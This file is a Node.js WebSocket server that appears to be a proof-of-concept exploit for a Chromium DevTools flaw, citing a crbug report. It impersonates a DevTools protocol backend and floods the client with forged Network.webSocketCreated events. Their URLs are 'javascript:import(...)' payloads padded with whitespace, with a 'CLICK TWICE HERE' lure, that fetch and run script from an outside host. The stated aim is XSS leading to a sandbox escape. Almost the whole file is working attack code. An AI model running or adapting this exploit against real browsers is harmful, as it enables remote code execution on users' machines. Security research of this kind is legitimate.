import { WebSocketServer } from 'ws';
import * as readline from 'node:readline';

// Based on server from https://crbug.com/40942152 by Matan Berson

// Update this for each scenario
var payloadUrl = 'https://aogarantiza.com/chromium/devtools-xss-download-sandbox-escape-1a.js.php';

const port = 1337;

const wss = new WebSocketServer({ port: port });
var g_wss_con;

var listenForInput = () => {
    readline.emitKeypressEvents(process.stdin);
    process.stdin.on('keypress', (ch, key) => {
      if (!key) { return; }
      if (key.ctrl && key.name == 'c') {
        process.exit();
      }
    });

    process.stdin.setRawMode(true);
}

listenForInput();

var sendMsg = () => {
    if (!g_wss_con) { return; }
    g_wss_con.send(JSON.stringify({
        method: "Network.webSocketCreated",
        params: {
            requestId: "har-0",
            url: `javascript:import('${payloadUrl}')  // ` + " ".repeat(500)
        }
    }));
    g_wss_con.send(JSON.stringify({
        method: "Network.webSocketCreated",
        params: {
            requestId: "har-0",
            url: `javascript:import('${payloadUrl}')  // CLICK TWICE HERE ` + " ".repeat(500)
        }
    }));
    console.log("Sent events");
}

wss.on("connection", function connection(wss_con) {
    g_wss_con = wss_con;
    console.log("Connection established.");
    wss_con.on("message", msg => {
        var msgString = msg.toString();
        if (typeof msg == 'object') {
            msg = JSON.parse(msg.toString())
        }
        console.log("> ", msgString);
    });
    for (var i=0; i<20; i++) {
        sendMsg();
    }
});

console.info(`Running WebSocket server on port ${port}`);